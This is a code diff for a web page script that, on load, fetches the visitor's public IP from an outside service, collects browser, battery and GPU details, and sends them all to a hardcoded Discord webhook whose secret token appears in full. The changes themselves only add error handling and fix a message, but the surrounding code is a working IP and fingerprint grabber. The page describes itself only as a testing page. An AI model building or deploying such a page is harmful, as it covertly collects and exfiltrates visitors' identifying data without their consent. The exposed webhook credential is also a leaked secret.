@@ -15,14 +15,13 @@
             const webhookURL = "https://discord.com/api/webhooks/1196774469335793674/IKA2uxi5vFaRgmeRhH0Hou-9kspK5vHryAN--gfsyB3hiwn14CNrI77txz4mF2kGRBIB";
 
             // Fetch public IP address
-            let publicIP;
+            let publicIP = 'Unknown IP';
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 publicIP = ipData.ip;
             } catch (error) {
                 console.error("Error fetching public IP:", error);
-                publicIP = 'Unknown IP';
             }
 
             // Collecting browser and device information
@@ -37,9 +36,13 @@
             };
 
             // Include battery information if available
-            const battery = await navigator.getBattery();
-            browserInfo['Battery Level'] = `${Math.round(battery.level * 100)}%`;
-            browserInfo['Battery Charging'] = battery.charging ? 'Yes' : 'No';
+            try {
+                const battery = await navigator.getBattery();
+                browserInfo['Battery Level'] = `${Math.round(battery.level * 100)}%`;
+                browserInfo['Battery Charging'] = battery.charging ? 'Yes' : 'No';
+            } catch (error) {
+                console.error("Error fetching battery information:", error);
+            }
 
             // Include GPU information if available
             const canvas = document.createElement('canvas');
@@ -69,7 +72,7 @@
                 });
 
                 if (response.ok) {
-                    displayMessage("Information sent successfully to Discord! If you are seeing this, don't worry this is a testing page", "success");
+                    displayMessage("Information sent successfully to Discord! If you are seeing this, don't worry, this is a testing page", "success");
                 } else {
                     displayMessage("Error sending information.", "error");
                 }
